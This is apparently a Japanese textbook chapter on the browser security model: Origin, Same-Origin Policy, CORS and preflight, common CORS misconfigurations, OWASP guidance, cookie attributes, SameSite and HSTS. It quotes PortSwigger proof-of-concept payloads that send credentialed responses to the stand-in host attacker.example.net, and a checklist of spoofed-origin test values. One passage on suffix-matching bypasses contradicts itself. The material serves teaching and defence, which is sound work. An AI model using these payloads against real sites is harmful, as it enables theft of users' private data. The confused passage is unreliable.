# 第2章 ブラウザのセキュリティモデル


## Origin概念・Same-Origin Policy・CORS

クライアントサイド脆弱性を狩る上で、最初に押さえるべき「土台」がOrigin（オリジン）の概念と、それを軸に動くSame-Origin Policy（SOP、同一オリジンポリシー）、そしてその制限を意図的に緩める仕組みであるCORS（Cross-Origin Resource Sharing）です。XSSやpostMessageの悪用、CSRF、情報漏えい系のバグの多くは、「なぜこの通信がブロックされないのか」「なぜこのデータが読めてしまうのか」という疑問をSOP/CORSのルールに照らして解くことから見つかります。本節では、この2つの仕組みを「ブラウザの内部でどう判定されているか」というレベルまで掘り下げて解説します。

### Originとは何か

Originは「スキーム（プロトコル）」「ホスト（ドメイン）」「ポート番号」の3つ組で定義されます。この3つがすべて一致する場合のみ「同一オリジン（same-origin）」と判定され、1つでも異なれば「クロスオリジン（cross-origin）」です。

| 比較対象URL | `https://example.com/page1` との関係 | 理由 |
|---|---|---|
| `https://example.com/page2` | 同一オリジン | パス違いはOriginに影響しない |
| `http://example.com/page1` | 異なるオリジン | スキームが `https` と `http` で違う |
| `https://sub.example.com/page1` | 異なるオリジン | ホストがサブドメイン違い |
| `https://example.com:8443/page1` | 異なるオリジン | ポート番号が違う（省略時は既定ポート443/80として比較） |
| `https://example.com/page1?x=1#frag` | 同一オリジン | クエリ文字列・フラグメントはOriginに含まれない |

この判定はブラウザのあらゆるセキュリティ機構（Cookieのスコープ、`localStorage`/`sessionStorage`の分離、DOMアクセス制御、Fetch/XHRの応答読み取り制御、`postMessage`のOrigin検証対象など）で共通の基盤として使われます。つまりOriginという1つの単純な概念が、ブラウザ全体のセキュリティモデルの「境界線」を引いていると理解してください。

### Same-Origin Policy（SOP）が何を「禁止」し、何を「許可」しているか

SOPの本質を一言で言うと、**「クロスオリジンへのリクエスト送信自体は多くの場合許可されるが、そのレスポンス内容をJavaScriptから読み取ることは禁止される」**というルールです。これは初学者が誤解しやすいポイントで、「SOPがあるから外部サイトへの通信はできない」わけではありません。

具体的には以下のような挙動になります。

- `<img src="https://other-origin.example/x.png">` や `<script src="https://other-origin.example/lib.js">` のような「埋め込み系タグ」によるクロスオリジンのリクエストは、そもそもSOPの制限対象外で普通に発生します（レスポンスの中身を直接JSから読めないだけで、画像は描画され、スクリプトは実行されます）。
- `fetch()` や `XMLHttpRequest` によるクロスオリジンリクエストは、リクエスト自体はネットワーク上飛んでいく（＝サーバー側の副作用は起こり得る）が、**レスポンスボディの読み取りがブラウザによってブロックされる**のがデフォルトの挙動です。これがCSRF（Cross-Site Request Forgery）が成立する理由の一つでもあります。「送れるが読めない」という非対称性がSOPの核心です。
- `<iframe>` で他オリジンのページを埋め込んだ場合、そのフレーム内のDOM（`document`オブジェクトなど）へ親フレームからスクリプト経由でアクセスすることはSOPによりブロックされます。

> ⚠️ **未取得の資料**: 「A Comprehensive Guide to the Same-Origin Policy and the CORS Policy」（Emrebener, Medium）は自動取得できませんでした（理由: サーバーがHTTP 403 Forbiddenを返し、GitHubミラー等の代替も存在しなかったため）。以下のURLからご自身で直接ご覧ください: https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145
>
> （以下は未取得資料の補足として一般知識に基づく解説です）公開情報（記事タイトルや要約検索結果）から確認できる範囲では、同記事はSOPを「ブラウザに組み込まれた重要なセキュリティ機能で、あるオリジンのスクリプトが別オリジンへ自由にクロスオリジンリクエストを行うことを制限するもの」と説明し、CORSのプリフライトリクエストについて「ブラウザがクロスオリジンリクエストを受け取るサーバーに対して、そのリクエストを受け入れてよいか事前に確認する仕組み」と位置づけています。この理解は本節で述べる仕組み（後述のプリフライトの節を参照）と整合しており、SOP→CORSという学習順序で全体像を掴む構成になっていると考えられます。

### なぜこの非対称なルールが存在するのか（仕組みレベルの理解）

ブラウザは、レスポンスの「読み取り」だけを制限すればよいという設計を選びました。理由は歴史的経緯にあります。Webの初期から`<img>`, `<script>`, `<link>`, `<form>` によるクロスオリジンの「埋め込み」や「送信」は当たり前に使われてきたため、これらを今更ブロックすると既存のWebが壊れてしまいます。一方で、Ajax（`XMLHttpRequest`）が登場した際、「任意サイトのレスポンス内容をJSが自由に読める」ことを許すと、ログイン中のユーザーのブラウザを踏み台にして、そのユーザーだけがアクセスできる別サイトの機密情報（メール本文、APIトークン、個人情報など）をJSで盗み取れてしまいます。これを防ぐために、「リクエストは飛ばせるがレスポンスは読めない」という非対称な設計が採用されました。

実装上は、ブラウザのネットワークスタックがレスポンスを受け取った後、そのレスポンスを要求元のJavaScriptコンテキスト（オリジン）に渡す直前に、リクエスト元オリジンとレスポンス元オリジンを比較します。異なる場合、CORSヘッダによる明示的な許可がない限り、`fetch()`のPromiseは失敗せず（レスポンス自体は届く「opaqueレスポンス」になる実装もある）、JS側からは中身にアクセスできないか、`XMLHttpRequest`ではネットワークエラーとして扱われます。この「ブロックする層」がブラウザ内部の一点に集約されているため、SOPは各Webアプリケーションが個別に実装する必要のない、ブラウザが保証する基盤的な防御機構になっています。

### CORSとは何か、なぜ必要か

CORS（Cross-Origin Resource Sharing）は、SOPによる「レスポンス読み取り禁止」という原則を、**サーバー側の明示的な合意（HTTPレスポンスヘッダ）**によって緩和する仕組みです。マイクロサービス化やSPA（Single Page Application）とAPIサーバーの分離が進んだ結果、正当な理由でクロスオリジン通信が必要になるケースが増え、それに対応するために標準化されました。

PortSwiggerの解説では、SOPとCORSの関係を次のように整理しています。

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

CORS実装の基本は、サーバーがレスポンスに `Access-Control-Allow-Origin`（以下ACAO）ヘッダを付与し、そのオリジンからのクロスオリジン読み取りを許可することです。

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted-website.com
```

ブラウザは、リクエストを送ったスクリプトのオリジン（例: `https://trusted-website.com`）と、このACAOヘッダの値が一致するかを確認し、一致すればレスポンスの読み取りを許可します。**この判定は完全にブラウザ側で行われる**点が重要です。サーバーがACAOヘッダを返しても、それは「この呼び出し元オリジンにはレスポンスを読ませてよい」というサーバーからブラウザへの意思表示に過ぎず、リクエスト自体の到達やサーバー側処理の実行を止めるものではありません。

### Cookie等の認証情報を伴うクロスオリジンリクエスト

Cookieを使ったセッション管理をしているアプリケーションに対してcrossOriginなXHR/fetchを行う場合、デフォルトではブラウザはCookieを送信しません。送信させるには、リクエスト側で明示的にフラグを立てる必要があります。

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();
```

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

この`req.withCredentials = true`が、Cookieを含む認証情報付きリクエストを送るためのスイッチです。さらに、サーバー側がこのレスポンスの読み取りを許可するには、ACAOヘッダに加えて `Access-Control-Allow-Credentials: true` を返す必要があります。ここで仕組み上重要な制約があります。**認証情報を伴うリクエストの場合、ACAOヘッダにワイルドカード`*`を指定することはブラウザの仕様で許可されません。** サーバーは具体的なオリジン文字列を返す必要があります。これは「誰でも読める」設定と「Cookie付きで読める」設定を同時に許すと、任意のサイトがログイン中ユーザーのセッションで機密データを盗めてしまうため、ブラウザ側で意図的に塞がれている抜け道です。

### プリフライトリクエスト（Preflight Request）の仕組み

すべてのクロスオリジンリクエストが単純に送信されるわけではありません。ブラウザは、リクエストが「単純リクエスト（simple request）」の条件（メソッドがGET/HEAD/POSTのいずれか、かつ特定の限られたヘッダとContent-Typeのみを使用、など）を満たさない場合、実際のリクエストの前に**OPTIONS メソッドによる「プリフライトリクエスト」**を自動的に送信します。

プリフライトの流れは次の通りです。

1. ブラウザがOPTIONSリクエストを送信し、`Origin`、`Access-Control-Request-Method`（実際に使う予定のHTTPメソッド）、`Access-Control-Request-Headers`（実際に使う予定のカスタムヘッダ）をヘッダに含める。
2. サーバーはこのOPTIONSリクエストに対し、許可するオリジン・メソッド・ヘッダを `Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers` として返す。
3. ブラウザはこの返答を確認し、実際に予定していたリクエスト（PUTやDELETE、`Content-Type: application/json`を使ったPOSTなど）を許可するかどうかを内部で判定する。許可されていれば実際のリクエストを送信する。

この仕組みが存在する理由は、「複雑なリクエスト（サーバーに副作用を与えやすいメソッドやカスタムヘッダを使うもの）については、実際に送る前にサーバーの同意を得る」という、Ajax以前には存在しなかったリクエスト形態に対する後方互換性配慮です。単純リクエストは`<form>`タグでも昔から送信可能だったため今更ブロックしても意味がありませんが、JSON APIへのPUT/DELETEのような形式はブラウザネイティブの`<form>`では発生し得なかったため、プリフライトという新しい確認ステップが導入されました。

### 脆弱なCORS設定のパターン

PortSwiggerは、実際に悪用可能なCORS設定ミスのパターンを複数示しています。

#### 1. リクエストのOriginヘッダをそのまま反射する実装

サーバーが受け取った `Origin` リクエストヘッダの値を検証せずにそのまま `Access-Control-Allow-Origin` に反映してしまう実装です。これは「任意のオリジンからのアクセスを許可している」のと実質同じであり、攻撃者は自分のオリジンから被害者のブラウザ経由で標的サイトのAPIを呼び出し、Cookie付きでレスポンスを盗み出せます。

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//attacker.example.net/log?key=' + this.responseText;
}
```

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

このコードを攻撃者が用意したページ（`https://attacker.example.net`）に埋め込み、Cookie認証済みの被害者にそのページを踏ませることで、標的サイトの`sensitive-victim-data`レスポンスを攻撃者サーバーへ横流しできます。これが成立する原因は、サーバーが「送られてきたOriginヘッダ＝信頼できるオリジン」と誤解し、動的にACAOへコピーしてしまう実装ミスにあります。

#### 2. Originヘッダのパース処理の誤り（部分一致・サブドメイン検証の甘さ）

ホワイトリスト方式で許可オリジンを判定する実装で、文字列の部分一致や正規表現の誤りにより意図しないオリジンを通してしまうケースです。

- `normal-website.com` を許可する意図で、Origin文字列に `normal-website.com` が「含まれているか」だけをチェックすると、`hackersnormal-website.com` のようなオリジンも通ってしまいます（`normal-website.com`という文字列を含むだけの別ドメイン）。
- `normal-website.com` のサブドメインを許可する意図で末尾一致だけをチェックすると、`normal-website.com.evil-user.net` のようなオリジンも通ってしまいます（ドメイン構造上はevil-user.netのサブドメインだが、文字列としては`normal-website.com`で終わらないので実際にはこの例だと通らないが、`.`の有無を正しく検証しない実装だと`xnormal-website.com`のような紛れ込みが起きる、という点が実務上の落とし穴です）。

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

このクラスのバグの本質は、**Originという「構造化された文字列（scheme://host:port）」を、単純な文字列マッチ（`indexOf`や緩い正規表現）で扱ってしまう**ことです。安全にホワイトリスト判定を行うには、Originヘッダをスキーム・ホスト・ポートに正しくパースした上で、ホスト部分は完全一致（サブドメインを許可する場合は`.`区切りでの厳密な末尾一致）で比較する必要があります。

#### 3. `null` Originのホワイトリスト化

一部の実装は、開発時の利便性やサンドボックス化されたリクエストへの対応のために、Originヘッダが `null` の場合を許可リストに含めてしまうことがあります。`null` Originは、`file://` プロトコルからのリクエストや、サンドボックス化された`<iframe>`から発生し得ます。攻撃者は次のようなペイロードでこれを悪用できます。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='https://attacker.example.net/log?key='+this.responseText;
            }
        </script>">
</iframe>
```

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

`sandbox`属性付きの`<iframe>`に`allow-same-origin`を指定しない場合、そのフレームのOriginは強制的に`null`になります。サーバーが`null`を信頼済みオリジンとして扱っていると、この`data:`スキームのiframeから発行したリクエストが正規の許可済みオリジンとして扱われ、Cookie付きで機密データを読み取られます。

#### 4. サブドメインへの過剰な信頼

親ドメインが自身のすべてのサブドメイン（`*.example.com`など）をCORSで信頼している場合、いずれか1つのサブドメインにXSSやサブドメイン乗っ取りのような脆弱性があれば、そこを踏み台にして親ドメインのCORS保護されたAPIにアクセスできてしまいます。CORSの信頼範囲は、実際にはその範囲全体のセキュリティレベルに引きずられるという点を意識する必要があります。

#### 5. HTTPとHTTPSの混在許可

HTTPSサイトが、HTTP（非TLS）のサブドメインをCORSで信頼していると、中間者攻撃（MitM）によってそのHTTPサブドメインへの通信を改ざんされ、悪意あるレスポンスを注入されるリスクがあります。TLSの保証がない通信経路を信頼の輪に含めてしまうと、CORSによる「オリジンの同一性」の保証自体が崩れます。

#### 6. 内部ネットワーク向けAPIでのワイルドカード使用

企業のイントラネット内部でのみ使うことを想定したAPIが `Access-Control-Allow-Origin: *` を返し、かつCookie認証を使っていない設計であっても、社内ネットワークにアクセスできる立場の攻撃者（あるいは社内ユーザーが外部の悪意あるサイトを閲覧した場合のブラウザ）が、外部の任意サイトから内部ネットワークのAPIを直接呼び出せてしまいます。CORSがなければそもそも到達できない社内リソースへの「踏み台」を、ワイルドカードCORSが提供してしまう典型例です。

### CORSは何を守るものではないか（重要な誤解の解消）

PortSwiggerは次の点を明確に指摘しています。

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

CORSは「サーバー側の機密データ保護の代替にはならない」という原則と、「CORSはCSRFのような攻撃に対する防御策ではない」という原則です。前者は、CORSがブラウザ側の読み取り制限に過ぎず、サーバー自体が認可（authorization）チェックを行わなければ、そもそもCORS以前の話としてAPIが誰でも呼べてしまう、という当たり前だが見落とされがちな注意点です。後者は、CSRFは「レスポンスを読む」のではなく「リクエストを送ることで副作用（状態変更）を起こす」攻撃であるため、レスポンス読み取りを制御するCORSでは防げない、という区別です。CSRF対策には別途CSRFトークンやSameSite Cookie属性などが必要になります。この違いを混同すると、「CORSを正しく設定したからCSRFも防げている」という誤った安心につながるため要注意です。

### OWASPによる防御指針（postMessageとStorageを含む横断的な視点）

OWASP HTML5 Security Cheat Sheetは、CORSだけでなく、クライアントサイドで頻出する`postMessage`とWeb Storageについても、SOPの発想を土台にした防御指針をまとめています。

CORSに関する指針として、次のように述べられています。

> 出典: HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

要点は「`Access-Control-Allow-Origin`には信頼できる特定のドメインのみを列挙し、ワイルドカードや、受け取った`Origin`ヘッダをそのまま無検証で返すことは避けるべき」という、前述のPortSwiggerの脆弱パターンと表裏一体の防御原則です。加えて、HTTPとHTTPSが混在するオリジンを許可しないこと、プリフライト（OPTIONS）だけでなく実際のGET/POSTリクエストに対しても正しくアクセス制御を適用すること、そしてOriginヘッダはブラウザ外のクライアント（curlなど）からは自由に偽装可能なので、CSRF対策の代替として使わないことが強調されています。

`postMessage`については、ウィンドウ間・iframe間でメッセージをやり取りする際、SOPの制限を意図的に迂回する数少ない標準APIであるため、独自の検証が必須になります。

- 送信側は、`postMessage(message, targetOrigin)`の第2引数`targetOrigin`に`*`ではなく、送信先の想定オリジンを明示的に指定すべきです。送信先ページがナビゲーションによって別オリジンへ変わった場合に、意図しない相手にメッセージが届くことを防ぐためです。
- 受信側は、`message`イベントハンドラ内で`event.origin`を検証し、想定するオリジンと完全一致するかを確認する必要があります。部分一致や`indexOf`のような緩い検証では、前述のCORSと同様の「文字列マッチの落とし穴」が発生します。
- 受信したデータ（`event.data`）は、想定するフォーマットかどうかを検証し、`eval()`で実行したり、サニタイズせずに`innerHTML`へ挿入したりしてはいけません。これらはSOP/CORSの話とは別レイヤーですが、`postMessage`はオリジン間通信の「穴」であるがゆえに、受け取った後のデータ処理もXSSの入口になりやすい点に注意が必要です。

> 出典: HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

Web Storage（`localStorage`/`sessionStorage`）についても、OriginごとにStorageが分離されるというSOPの延長線上の設計ですが、以下の点が強調されています。

- ローカルストレージはブラウザプロファイルにアクセスできる人間（マシンへのローカルアクセス権を持つ人）から容易に読み取れるため、そこに認証トークンやセッションIDを保存すべきではありません。セッション管理にはHttpOnly属性付きのCookieを使うべきで、これはJavaScriptから読み取れない（＝XSSで盗まれにくい）という利点があります。
- 永続化が不要なデータは`sessionStorage`を使い、タブを閉じれば消えるようにする。
- Storageに保存されたデータはすべて「信頼できない入力」として扱う。XSSが存在すれば同一オリジンのJavaScriptから自由に読み書きできるため、Storage自体はXSSに対する防御にはならない。

> 出典: HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

### まとめ：狩る側の視点でのチェックリスト

クライアントサイド脆弱性ハンティングの実務では、以下の観点でOrigin/SOP/CORSまわりを確認すると効率的です。

1. `Access-Control-Allow-Origin`の値が、リクエストの`Origin`ヘッダをそのまま反射していないか（動的反射の有無はOriginヘッダを変えて2回リクエストし、レスポンスのACAOが追従するかで確認できる）。
2. `Access-Control-Allow-Credentials: true`と組み合わさっている場合、反射や緩いホワイトリストが機密データの窃取に直結するため優先度を上げる。
3. ホワイトリスト実装が正規表現や部分一致でホスト名を判定していないか（`example.com.evil.com`や`evilexample.com`のようなペイロードで検証）。
4. `null` Originが許可リストに含まれていないか（sandboxed iframeやdata: URIでの検証）。
5. サブドメイン全体を信頼している場合、そのサブドメイン群にXSSやサブドメイン乗っ取りの余地がないか。
6. HTTPのオリジンがHTTPSアプリケーションの信頼リストに含まれていないか。
7. `postMessage`の送受信双方でOrigin検証が厳密か、受信データがサニタイズなしでDOMに挿入されていないか。
8. セッションIDやトークンが`localStorage`に平文で保存されていないか（XSSとの複合リスクとして評価）。

これらはいずれも、本節で説明した「Originという3つ組による境界」「レスポンス読み取りだけを制限するSOPの非対称性」「その制限を明示的な合意で緩めるCORS」という原理の理解があれば、初見のアプリケーションでも系統立てて確認できるようになります。

## Cookie属性とセキュリティヘッダ

クライアントサイド脆弱性ハンティングにおいて、CookieとHTTPセキュリティヘッダは「ブラウザのセキュリティモデルの設定ファイル」に相当する。XSSが成立しても盗めるものが変わり、CSRFが成立するかどうかが変わり、クリックジャッキングやクロスオリジンの情報漏えいが成立するかどうかが変わる——それを決めているのがこの章で扱う一連の属性・ヘッダである。ここでは「攻撃者がどこを狙うか」ではなく「防御側がどこを固めるべきか」という観点で、各属性・ヘッダの仕組みと推奨値を整理する。

### 1. Set-Cookieの基本構文とセキュリティ属性

Cookieはサーバーが`Set-Cookie`レスポンスヘッダで発行し、ブラウザがCookieストア（cookie jar）に保存する。以降、そのCookieの発行条件に一致するリクエストにブラウザが自動的に付与して送信する。この「自動付与」という性質こそが、CSRF（Cross-Site Request Forgery、攻撃者サイトから被害者のブラウザ経由で正規サイトへ意図しないリクエストを送らせる攻撃）が成立する根本原因であり、同時にセッション管理を成立させている仕組みでもある。

基本的なSet-Cookieの構文は次の通りである。

```
Set-Cookie: session_id=abc123; Domain=example.com; Path=/; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Max-Age=3600; Secure; HttpOnly; SameSite=Lax
```

各フィールドの役割は以下の通り。

- **Domain**: Cookieを送信するホストの範囲を指定する。省略した場合はCookieを発行したホストのみに限定される（ホストオンリークッキー）。`Domain=example.com`のように明示すると、`sub.example.com`のようなサブドメインも含めて送信対象になる。範囲を広げるほど、あるサブドメインが乗っ取られた（サブドメインテイクオーバーされた）場合の影響範囲が広がるため、原則としてDomain属性は省略し、必要な場合のみ最小限のスコープで指定する。
- **Path**: Cookieが送信されるURLパスの範囲を指定する。ただしPathはセキュリティ境界としては信頼できない。同一オリジンの別パスに配置されたスクリプトからは`document.cookie`で読めてしまうことが多く、パスによるアクセス制御は補助的なものに過ぎない。
- **Expires / Max-Age**: Cookieの有効期限。両方省略するとセッションクッキー（ブラウザを閉じると消える）になる。Max-Ageの方が相対時間指定でクロックスキューの影響を受けにくく優先される。
- **Secure**: HTTPS接続でのみCookieを送信する属性。この属性がないと、同じCookieが平文HTTP経由でも送信されてしまい、能動的なネットワーク盗聴者（Man-in-the-Middle）がセッションCookieを平文で取得できてしまう。HTTPページからHTTPSページへの遷移時にも、HTTP側で発行されたCookieがそのまま使われるケースがあるため、Secure属性は「常時HTTPS化」とセットで運用する必要がある。
- **HttpOnly**: JavaScriptの`document.cookie`からの読み取り・書き込みを禁止する属性。これによりXSSが発生してもインラインスクリプト経由で直接Cookie文字列を盗み出すことができなくなる。ただし後述の通り、HttpOnlyは「Cookie窃取」を防ぐだけで、「そのCookieを使った操作」自体は防がない点に注意が必要である。
- **SameSite**: クロスサイトリクエストにCookieを付与するかどうかを制御する属性。詳細は次節で扱う。

> ⚠️ **未取得の資料**: 「Secure/HttpOnly/SameSite と Set-Cookie の解説（Medium, João Manuel Gomes, The Startup）」は自動取得できませんでした（理由: サーバーがHTTP 403 Forbiddenを返し本文を取得できず、WebSearchでも要約スニペットのみで原文全文は得られなかった）。以下のURLからご自身で直接ご覧ください: https://medium.com/swlh/secure-httponly-samesite-http-cookies-attributes-and-set-cookie-explained-fc3c753dfeb6
>
> （以下は未取得資料の補足として一般知識に基づく解説です）記事の要点は検索結果の要約から、Secure/HttpOnly/SameSiteの3属性がそれぞれ独立した攻撃経路を塞ぐという整理であり、認証用Cookieには`Set-Cookie: session_id=abc123; Secure; HttpOnly; SameSite=Lax`のように3属性すべてを付けることが推奨されている。これは本節で述べる内容と一致する一般的なベストプラクティスである。加えて、HttpOnly付きCookieであっても`fetch()`のような通常のHTTP通信では自動的に送信される（JavaScriptから値を「読む」ことはできないが、ブラウザが「送る」動作自体は止まらない）という点が強調されており、これはCSRF対策としてHttpOnlyだけでは不十分でSameSiteやCSRFトークンが必要になる理由でもある。

#### なぜHttpOnlyだけではCSRFを防げないのか

HttpOnlyはあくまで「JavaScriptからのCookie値の読み取り」を防ぐものであり、「ブラウザがそのCookieをリクエストに自動添付する」動作そのものは止めない。攻撃者サイト上のフォームや`<img>`タグ、`fetch(..., {credentials: 'include'})`などがブラウザに正規サイトへのリクエストを発行させた場合、HttpOnly属性の有無にかかわらずCookieは自動的に付与される。攻撃者はCookieの中身を知る必要すらなく、被害者のブラウザに「代わりにリクエストを送らせる」だけでよい。これがCSRFの本質であり、これを止めるのがSameSite属性とCSRFトークンである。

### 2. SameSite属性: Strict / Lax / Noneの挙動

SameSite属性は、あるリクエストが「サイトをまたぐ（クロスサイト）」ものかどうかを判定し、クロスサイトの場合にCookieを送るかどうかを制御する。ここでいう「サイト」とは、オリジン（スキーム＋ホスト＋ポート）よりも粗い単位で、eTLD+1（実効トップレベルドメイン＋1ラベル、例: `example.com`）を基準に同一サイト判定を行う。つまり`app.example.com`と`shop.example.com`はオリジンとしては別だが、サイトとしては同一サイト（same-site）である。

web.devの記事「SameSite cookies explained」は、3つの値の挙動を次のように説明している。

```
Set-Cookie: promo_shown=1; SameSite=Strict
```

**Strict**は最も制限的な設定である。記事の説明を引用すると、"When the user is on your site, the cookie is sent with the request as expected. However, if the user follows a link into your site from another one, the cookie isn't sent on that initial request."（ユーザーがそのサイト上にいる間はCookieが期待通り送信されるが、他サイトからのリンクをたどってそのサイトに遷移してきた最初のリクエストではCookieが送信されない）。つまり外部サイトからのリンククリックによる初回のトップレベルナビゲーションでもCookieが付かないため、たとえば「他サイトからリンクを踏んでログイン状態のまま遷移したい」ようなユースケースには向かない。銀行の送金操作用Cookieなど、外部からの遷移で自動ログイン状態になる必要が全くない、極めて機微な操作向けの設定である。

```
Set-Cookie: promo_shown=1; SameSite=Lax
```

**Lax**は中間的な設定である。トップレベルナビゲーション（ユーザーがリンクをクリックする、フォームをGETで送信する、ブラウザのアドレスバーに入力するなど、ブラウザのURLバーに表示されるページ遷移）でかつHTTP GETのような「安全な」メソッドの場合にはクロスサイトでもCookieを送信するが、クロスサイトの`<img>`読み込みや`<iframe>`埋め込み、バックグラウンドの`fetch`/`XMLHttpRequest`ではCookieを送信しない。これにより、外部サイトのリンクを踏んで正規サイトに移動した際にはログイン状態が維持されつつ、隠れた画像タグや自動送信フォームによるクロスサイトPOSTのようなCSRF典型パターンではCookieが付かずセッションが機能しない、というバランスを取っている。

```
Set-Cookie: widget_session=abc123; SameSite=None; Secure
```

**None**はすべてのコンテキスト（クロスサイトの`<iframe>`埋め込みウィジェット、サードパーティの決済ボタン、クロスサイトのAjaxリクエストなど）でCookieを送信する。正規のサードパーティ連携（例: 埋め込みチャットウィジェット、シングルサインオン連携、決済プロバイダのiframe）ではこの設定が必要になる場合があるが、CSRF保護は一切効かなくなるため、CSRFトークンなど別の防御機構と必ず併用しなければならない。

#### デフォルト値の変遷: Chrome 80 (2020年2月) 以降

web.devの記事は、"Cookies without a `SameSite` attribute are treated as `SameSite=Lax`"（SameSite属性を指定していないCookieはSameSite=Laxとして扱われる）と述べている。これはChrome 80（2020年2月リリース）で導入された`SameSite=Lax by default`という仕様変更であり、それ以前はSameSite属性を省略すると事実上`None`相当（無制限にクロスサイト送信される）の挙動だった。この変更は業界標準として他のモダンブラウザ（Firefox、Edgeなど）にも順次波及しており、2026年時点では「SameSite省略＝Lax扱い」が主要ブラウザの共通挙動になっている。この変更の狙いは、開発者が明示的に選択しない限り、デフォルトでCSRFに対して安全側に倒すことである。裏を返せば、意図的にクロスサイトでCookieを送りたい場合は`SameSite=None`を明示しなければならなくなった。

#### SameSite=NoneにSecureが必須になった理由

記事は"When you create cross-site cookies using `SameSite=None`, you must also set them to `Secure` for the browser to accept them."（`SameSite=None`でクロスサイトCookieを作る場合、ブラウザに受理させるには`Secure`属性も同時に設定しなければならない）と説明している。これはChromeやFirefoxなどが仕様レベルで強制している挙動で、`SameSite=None`かつ`Secure`が付いていないCookieはブラウザによって拒否・削除される。理由は仕組みレベルで理解しておく価値がある。SameSite=Noneはクロスサイトの任意のコンテキストからCookieが送信されることを許可する設定であり、これはCookieの露出範囲を最大化する。もしこの状態でHTTP平文通信も許容してしまうと、ネットワーク上の盗聴者が中間者攻撃でクロスサイトCookieを平文キャプチャできてしまい、SameSite=Noneの緩さとSecureなしの緩さが掛け合わさって被害が最大化する。そのため、ブラウザベンダーは「クロスサイト送信を許可するなら、最低限通信路は暗号化されていることを保証する」という形で、Secure必須をポリシーとして強制した。

#### 後方互換性の問題

記事では、"Some earlier versions of browsers, including Chrome, Safari, and UC browser, are incompatible with the new `None` attribute, and might ignore or restrict the cookie."（Chrome、Safari、UCブラウザを含む一部の旧バージョンブラウザは新しい`None`属性と互換性がなく、そのCookieを無視または制限する場合がある）と警告している。具体的には、Chrome 51〜66やSafariの一部バージョンは`SameSite=None`を「無効な値」として認識し、Cookie自体を拒否したり、`Strict`相当として扱ったりする既知の不具合（web.devの原記事、および[chromium.org のIncompatible Clients一覧](https://www.chromium.org/updates/same-site/incompatible-clients/)で個別に列挙されている）があった。そのため、サードパーティCookieに依存するサービスを設計する際は、UAスニッフィングによる分岐や、影響を受けるトラフィック割合の事前分析が推奨されている。2026年時点ではこれらの旧ブラウザはシェアが極めて小さくなっているが、レガシー環境をサポート対象に含める場合は依然として考慮が必要な既知の互換性問題である。

> 出典: SameSite cookies explained — https://web.dev/articles/samesite-cookies-explained

#### Schemeful Same-Site（補足）

一般知識として補足すると、同一サイト判定は当初ホスト名（eTLD+1）のみで行われていたが、その後スキーム（`http://`か`https://`か）も判定に含める「Schemeful Same-Site」という拡張がChromeなどに導入されている。この方式では`http://example.com`と`https://example.com`は同一サイトとはみなされず、クロスサイト扱いになる。これは、HTTPページに対する能動的なネットワーク攻撃者がHTTPS版のCookieに影響を与えることを防ぐための、混在コンテンツ・ダウングレード攻撃対策である。常時HTTPS化されたサイトであれば影響は小さいが、HTTPとHTTPSが混在する移行期のサイトでは、同一ドメインでもCookieがsame-site扱いされずSameSite=Laxのnavigationルールなどに影響することがある。

### 3. OWASPが推奨するセキュリティヘッダ一覧

OWASP HTTP Headers Cheat Sheetは、ブラウザに追加のセキュリティ制約を課すレスポンスヘッダ群を整理している。ここではCookie以外の主要ヘッダを、仕組みと推奨値つきで解説する。

#### Strict-Transport-Security (HSTS)

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

HSTSは「このホストへは今後HTTPSでのみ接続せよ」とブラウザに指示するヘッダである。`max-age`（秒単位、上記は約2年）の間、ブラウザはユーザーが`http://`で入力しても自動的に`https://`へ内部的に書き換えてから接続する。これは単なるリダイレクトとは異なり、最初の1回の平文リクエストすら発生させない点が重要である。HTTPリダイレクト（HTTP 301などによるhttps化）だけに頼ると、最初のHTTPリクエスト自体が中間者に平文で観測され、そこでセッションCookieを盗まれたりページ内容を改ざんされたりする「SSL Stripping」攻撃が成立しうる。HSTSはブラウザ側のキャッシュされたポリシーとして機能するため、2回目以降のアクセスではこの脆弱な平文リクエストが発生しなくなる。`includeSubDomains`を付けるとすべてのサブドメインにも同ポリシーが適用され、`preload`はブラウザベンダーが管理するプリロードリストへの登録を意図した指定で、初回アクセス時点から（DNSで名前解決する前から）HTTPS強制を効かせられる。ただし、HSTSはドメインに対して長期間有効になるため、証明書の運用停止やドメイン譲渡時に「もうHTTPSで動いていないのにブラウザがHTTPS接続を強制し続けアクセス不能になる」という運用上のリスクがある点に注意が必要である。

#### X-Frame-Options / frame-ancestors

```
X-Frame-Options: DENY
```

